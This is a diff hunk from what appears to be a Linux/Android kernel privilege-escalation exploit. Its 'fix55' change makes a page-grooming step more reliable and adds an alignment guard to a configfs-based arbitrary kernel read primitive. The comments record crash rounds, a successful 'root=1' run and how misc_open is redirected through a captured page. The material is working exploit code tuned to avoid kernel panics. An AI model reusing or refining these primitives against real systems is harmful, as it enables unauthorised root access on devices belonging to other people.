@@ -4034,16 +4034,23 @@ uintptr_t prepare_kernel_page(int payload_mode) {
      * A phase-2 hit at any OTHER k is an unrelated order-3 page whose
      * true VA we cannot name (Tier-0's la0 is a guess off by
      * (k_true)*1GiB this boot), and routing through it jumps misc_open
-     * into garbage.  When the free oracle itself saw nothing (k_true<0,
-     * free ran in rcuop context) the single-hit rule stands alone, as
-     * before fix54. */
+     * into garbage.
+     * fix55 (t15153, kernel_panic reboot): the k_true<0 fallback ("free
+     * oracle saw nothing, the single-hit rule stands alone") was the
+     * round that routed through a coincidence hit into a linear-map hole
+     * (cfgfs target ffffffb51d831051 -> deref -> panic).  Every safe
+     * round -- the 771b7409 root=1 run and all clean root=0 exits --
+     * had k_true>=0 with k_hit==k_true; the sole panic round had
+     * k_true=-1 + hit_idx=2/k_hit=0.  Require the oracle: k_true<0 now
+     * fails the gate and the capture retries safely (gate retries are
+     * cheap; the panic rounds cost a reboot). */
     int k_hit = -1;
     if (phase2_hit_idx >= 0 && phase2_hit_idx < tpw2.n && tpw2.est_pfn)
       k_hit = (int)(((long)tpw2.cand_pfn[phase2_hit_idx] -
                      (long)tpw2.est_pfn) /
                     (1L << 18));
     int hit_evidence = (phase2_hit_idx >= 0) && (tp_nhit2 == 1) &&
-                       (k_true < 0 || k_hit == k_true);
+                       (k_true >= 0 && k_hit == k_true);
     int vol_ok = (phase2_total_ok >= DRAIN_FLOOR) ||
                  (deterministic && hit_evidence);
     int drain_capture = (phase2_short_sends == 0 && vol_ok && hit_evidence);
@@ -4231,6 +4238,18 @@ ssize_t configfs_write_once(int fd, uintptr_t target, const void *data, size_t l
 
 static ssize_t cfgfs_read_ex(int fd, uintptr_t target, void *data, size_t len,
                              uint32_t needs_read_fill, int quiet) {
+  /* fix55 (t15153 kernel_panic + owner-forensics reboots 7/10): the
+   * configfs callback derefs the target-derived page inside the kernel --
+   * garbage is a data abort = panic, not a benign -1.  Reject at entry:
+   * every legitimate target here is 8-byte aligned (u64 field/head/page
+   * reads); t15153's dying read was ffffffb51d831051 (unaligned + a
+   * linear-map hole far past the 8GiB RAM).  Alignment alone cannot catch
+   * aligned garbage (the owner rounds proved that), but it costs nothing
+   * and catches this whole class. */
+  if (target & 7) {
+    errno = EINVAL;
+    return -1;
+  }
   unsigned char blob[128];
   /*
    * layout of the configfs_buffer overlaid on ashmem_area (see
